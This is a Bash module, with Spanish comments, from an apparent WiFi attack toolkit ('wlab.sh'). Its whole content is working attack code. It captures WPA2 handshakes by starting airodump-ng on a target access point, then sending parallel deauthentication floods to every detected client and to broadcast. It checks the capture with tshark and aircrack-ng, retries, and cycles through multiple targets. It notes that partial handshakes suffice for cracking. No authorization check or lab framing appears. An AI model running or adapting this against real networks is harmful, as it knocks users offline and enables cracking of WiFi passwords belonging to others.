#!/usr/bin/env bash
# lib/capture.sh — Lógica de captura de handshake WPA2
# No ejecutar directamente. Cargado por wlab.sh
#
# FLUJO POR INTENTO:
#   1. (Solo primer intento) Escanear clientes del AP
#   2. Iniciar airodump-ng en background              ← PRIMERO, siempre
#   3. Esperar 2s a que airodump abra el pcap
#   4. Deauth a TODOS los clientes en paralelo + broadcast  ← DESPUÉS
#   5. Monitorear sin tiempo predefinido:
#        · Cada 1s: tshark (rápido) si disponible — detección temprana
#        · Cada 3s: aircrack-ng (definitivo) — confirmación
#        · Salida INMEDIATA al detectar handshake
#        · CAP_MAX_SEC solo como límite de seguridad antibloqueo
#   6. Handshake → matar procesos, salir con éxito
#   7. Sin handshake → siguiente intento
#
# MULTI-TARGET: capture() retorna 1 en vez de die() para que el loop
# en wlab.sh pueda continuar con el siguiente target.

# _hs_tshark: verificación rápida y barata con tshark.
# Retorna 0 si hay ≥2 frames EAPOL en el .cap.
_hs_tshark() {
    [[ -z "$HAS_TSHARK" || ! -f "$1" ]] && return 1
    local n
    n=$(tshark -r "$1" -Y "eapol" -T fields -e frame.number 2>/dev/null | wc -l) || return 1
    (( n >= 2 ))
}

# _hs_aircrack: verificación definitiva con aircrack-ng.
# Retorna 0 si hay handshake completo.
_hs_aircrack() {
    [[ ! -f "$1" ]] && return 1
    aircrack-ng "$1" 2>/dev/null | grep -qE '[1-9][0-9]* handshake'
}

# _check_handshake: verificación completa con logging de resultados.
# Retorna 0 si hay handshake útil (completo o parcial suficiente).
_check_handshake() {
    local cap_file="$1"
    [[ ! -f "$cap_file" ]] && return 1

    # aircrack-ng — fuente de verdad para handshake completo
    local aircrack_out hs_count=0
    aircrack_out=$(aircrack-ng "$cap_file" 2>/dev/null || true)
    local frame_info
    frame_info=$(echo "$aircrack_out" | grep -oE '[0-9]+ handshake' | head -1) || true
    [[ -n "$frame_info" ]] \
        && hs_count=$(echo "$frame_info" | grep -oE '^[0-9]+') \
        || hs_count=0

    # tshark — frames EAPOL (handshake parcial también es crackeable)
    local eapol_count=0
    [[ -n "$HAS_TSHARK" ]] \
        && eapol_count=$(tshark -r "$cap_file" -Y "eapol" -T fields \
            -e frame.number 2>/dev/null | wc -l) || true

    if (( hs_count > 0 )); then
        ok "¡Handshake capturado! (aircrack: ${hs_count} | EAPOL: ${eapol_count} frames)"
        return 0
    fi
    if (( eapol_count >= 2 )); then
        ok "¡Handshake parcial válido! (${eapol_count} EAPOL frames — suficiente para crackear)"
        return 0
    fi

    return 1
}

# _monitor_capture: bucle de monitoreo event-driven, sin tiempo predefinido.
# Sale tan pronto como detecta handshake. CAP_MAX_SEC es solo límite de seguridad.
# Retorna 0 si detectó handshake, 1 si se agotó CAP_MAX_SEC.
_monitor_capture() {
    local adump="$1" deauth_pid="$2" cap_file="$3" clients="$4"
    local elapsed=0

    while true; do

        # Guardia: airodump muerto inesperadamente
        if ! kill -0 "$adump" 2>/dev/null; then
            echo "" >&2
            warn "airodump-ng terminó inesperadamente."
            return 1
        fi

        printf "\r  ${C}[%3ds] dump=%-6s deauth=%-6s clientes=%-2s${N}" \
            "$elapsed" "$adump" "$deauth_pid" "$clients" >&2

        # Cada segundo: tshark (barato) → si positivo, confirmar con aircrack
        if _hs_tshark "$cap_file" 2>/dev/null; then
            if _hs_aircrack "$cap_file" 2>/dev/null; then
                echo "" >&2
                _check_handshake "$cap_file"   # log con conteos detallados
                return 0
            fi
        fi

        # Cada 3s: aircrack directo (aunque tshark no haya visto nada aún)
        if (( elapsed > 0 && elapsed % 3 == 0 )); then
            if _check_handshake "$cap_file" 2>/dev/null; then
                echo "" >&2
                return 0
            fi
        fi

        # Límite de seguridad: nunca bloquear indefinidamente
        if (( elapsed >= CAP_MAX_SEC )); then
            echo "" >&2
            warn "Límite de seguridad alcanzado (${CAP_MAX_SEC}s) sin handshake en este intento."
            return 1
        fi

        sleep 1
        elapsed=$(( elapsed + 1 ))
    done
}

# capture_once: ciclo completo de intentos. Retorna 0 si capturó handshake.
capture_once() {
    local base="${TMP}/cap_${TARGET//:/_}"   # prefijo único por target

    # ── Escaneo de clientes (una sola vez — reutilizado en todos los intentos) ──
    hdr "Detectando clientes en '${SSID_NAME}'"
    local clients_count
    clients_count=$(detect_clients)
    [[ ! "$clients_count" =~ ^[0-9]+$ ]] && clients_count=0

    if (( clients_count > 0 )); then
        ok "${clients_count} cliente(s) detectado(s) — deauth paralelo a todos + broadcast."
    else
        warn "0 clientes detectados — solo deauth broadcast."
        warn "  Sin clientes el handshake es muy difícil. Verifica que haya dispositivos conectados."
    fi

    info "Intentos planificados: ${MAX_TRIES_DEFAULT}"

    # ── Loop de intentos ────────────────────────────────────────────────────────
    local attempt=1
    while (( attempt <= MAX_TRIES_DEFAULT )); do
        hdr "Intento ${attempt}/${MAX_TRIES_DEFAULT} — BSSID=${TARGET}  Canal=${CHANNEL}"

        rm -f "${base}"-*.cap 2>/dev/null || true
        local cap_log="${TMP}/cap_attempt${attempt}_${TARGET//:/_}.log"
        local deauth_log="${TMP}/deauth_attempt${attempt}_${TARGET//:/_}.log"

        # ── PASO 1: airodump-ng PRIMERO ──────────────────────────────────────
        info "Iniciando captura (airodump-ng, canal ${CHANNEL})..."
        airodump-ng \
            --bssid         "$TARGET"  \
            --channel       "$CHANNEL" \
            --output-format pcap       \
            --write         "$base"    \
            "$MON" > "$cap_log" 2>&1 &
        local adump=$!
        dbg "airodump-ng PID: ${adump}"

        # Esperar a que airodump abra el pcap y esté listo para capturar
        sleep 2
        if ! kill -0 "$adump" 2>/dev/null; then
            warn "airodump-ng murió al iniciar (intento ${attempt}). Log:"
            while IFS= read -r l; do warn "  $l"; done < "$cap_log" || true
            attempt=$(( attempt+1 )); continue
        fi
        ok "airodump-ng activo (PID ${adump})."

        # ── PASO 2: deauth a TODOS los clientes en paralelo + broadcast ──────
        local deauth_pid
        deauth_pid=$(run_deauth "$deauth_log")
        dbg "Deauth PID: ${deauth_pid}"

        # ── PASO 3: monitorear — salida inmediata al detectar handshake ──────
        local cf="${base}-01.cap"
        if _monitor_capture "$adump" "$deauth_pid" "$cf" "$clients_count"; then
            kill "$deauth_pid" 2>/dev/null || true; wait "$deauth_pid" 2>/dev/null || true
            kill "$adump"      2>/dev/null || true; wait "$adump"      2>/dev/null || true
            CAP_FILE="$cf"
            return 0
        fi

        # Tiempo agotado — limpiar procesos
        kill "$deauth_pid" 2>/dev/null || true; wait "$deauth_pid" 2>/dev/null || true
        kill "$adump"      2>/dev/null || true; wait "$adump"      2>/dev/null || true
        sleep 1

        dbg "Log deauth intento ${attempt}:"
        while IFS= read -r l; do dbg "  $l"; done < "$deauth_log" 2>/dev/null || true

        # Revisión final del .cap aunque el monitor no lo haya detectado en tiempo real
        if [[ -f "$cf" ]] && _check_handshake "$cf"; then
            CAP_FILE="$cf"
            return 0
        fi

        warn "Sin handshake en intento ${attempt}/${MAX_TRIES_DEFAULT}."
        (( attempt < MAX_TRIES_DEFAULT )) && { info "Esperando 3s antes del siguiente intento..."; sleep 3; }
        attempt=$(( attempt+1 ))
    done

    return 1
}

# capture: orquesta capture_once con re-escaneo si la caché estaba expirada.
# En modo multi-target retorna 1 en lugar de die() para no abortar la sesión.
capture() {
    hdr "Captura de handshake WPA2 — ${SSID_NAME:-$TARGET}"

    if capture_once; then
        write_meta
        return 0
    fi

    if (( META_LOADED == 2 )); then
        warn "Fallo con caché expirada — re-escaneando para verificar datos..."
        local old_target="$TARGET" old_channel="$CHANNEL"
        META_LOADED=0; rm -f "$META_FILE" 2>/dev/null || true

        run_scan
        local csv="${TMP}/scan-01.csv"
        local new_bssid new_channel row

        if [[ "$old_target" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            new_channel=$(awk -F',' -v b="${old_target^^}" '
                /^[0-9A-Fa-f]{2}:/ {
                    gsub(/ /,"",$1); gsub(/ /,"",$4)
                    if (toupper($1)==b) { print $4; exit }
                }' "$csv") || true
            new_bssid="$old_target"
        else
            row=$(awk -F',' -v s="$SSID_NAME" '
                /^[0-9A-Fa-f]{2}:/ {
                    for(i=1;i<=NF;i++) gsub(/^ +| +$/,"",$i)
                    if ($14==s && $6~/WPA/) { print $1"|"$4; exit }
                }' "$csv") || true
            new_bssid=$(cut -d'|' -f1 <<< "$row" 2>/dev/null) || true
            new_channel=$(cut -d'|' -f2 <<< "$row" 2>/dev/null) || true
        fi

        if [[ -z "$new_bssid" || -z "$new_channel" ]]; then
            warn "Re-escaneo sin resultados para '${SSID_NAME}'. ¿AP encendido y en rango?"
            _record_target_failure
            return 1
        fi

        new_bssid="${new_bssid^^}"
        dbg "Comparando: old=${old_target}/${old_channel}  new=${new_bssid}/${new_channel}"

        if [[ "$new_bssid" != "$old_target" || "$new_channel" != "$old_channel" ]]; then
            warn "Datos actualizados: BSSID ${old_target}→${new_bssid}  Canal ${old_channel}→${new_channel}"
            TARGET="$new_bssid"; CHANNEL="$new_channel"
            write_meta
            if capture_once; then
                write_meta
                return 0
            fi
            warn "Sin handshake tras reintento con datos renovados — continuando con siguiente target."
            _record_target_failure
            return 1
        else
            write_meta
            warn "Sin handshake. Datos verificados correctos."
            warn "  Causas: sin clientes activos, señal débil, PMF/MFP activo en el AP."
            _record_target_failure
            return 1
        fi

    elif (( META_LOADED == 1 )); then
        warn "Sin handshake. Caché fresca — datos correctos."
        warn "  Causas: sin clientes activos, señal débil, PMF activo."
        _record_target_failure
        return 1
    else
        warn "Sin handshake."
        warn "  Causas: sin clientes activos, señal débil, AP fuera de rango."
        _record_target_failure
        return 1
    fi
}
